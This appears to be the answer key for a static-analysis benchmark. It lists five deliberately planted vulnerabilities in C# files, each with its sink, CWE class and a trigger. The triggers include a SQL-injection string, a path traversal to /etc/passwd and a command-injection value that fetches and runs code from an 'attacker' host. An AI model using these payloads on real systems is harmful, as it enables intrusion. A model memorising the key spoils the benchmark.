# Answer key — IssueBlot injected findings

**Do not place this file inside `targets/issueblot/`.** It is the grading key
for the static-analysis target. Scan `targets/issueblot/src/` (which contains no
markers), then score the run's findings against the five below.

Because this target has **no execution oracle**, these are static findings: a
scanner earns credit for naming the sink, class, and location — not for
producing a working exploit. That is exactly why the source must stay
uncontaminated; recall of a documented finding is indistinguishable from
discovery here.

| # | File | Sink | Class (CWE) | Trigger |
|---|------|------|-------------|---------|
| 1 | `Data/IssueRepository.cs` | `command.CommandText = "... '%" + query + "%' ..."` | SQL injection (CWE-89) | `GET /issues/search?q=' OR 1=1--` |
| 2 | `Files/AttachmentService.cs` | `Path.Combine(_storageRoot, name)` → `File.ReadAllBytes` | Path traversal (CWE-22) | `GET /attachments/..%2f..%2f..%2fetc%2fpasswd` |
| 3 | `Export/ReportExporter.cs` | `Arguments = "-c \"pandoc ... " + label + ...\""` | OS command injection (CWE-78) | `label = "x; curl attacker/`sh`"` |
| 4 | `Restore/BackupService.cs` | `TypeNameHandling = TypeNameHandling.All` | Insecure deserialization → RCE (CWE-502) | `POST /backups/restore` with a `$type` gadget payload |
| 5 | `Auth/PasswordHasher.cs` | `MD5.Create()` + `const Pepper = "..."` | Weak hash (CWE-327) + hardcoded secret (CWE-798) | n/a — property of the code, not a request |

## Notes on grading
- **1–4 are high severity**; a competent scan should land all four.
- **5 is a "two findings in one file"** check — a good triage separates the weak
  algorithm (MD5) from the hardcoded secret (`Pepper`). Credit each.
- **Path.Combine subtlety (finding 2):** if `name` is an absolute path,
  `Path.Combine` discards the storage root entirely — worth noting whether the
  scanner catches only `../` traversal or also the absolute-path override.
- A scan that reports additional *plausible* issues (e.g. missing output
  encoding, no auth on any endpoint) is not wrong — record them, but the five
  above are the planted ground truth.
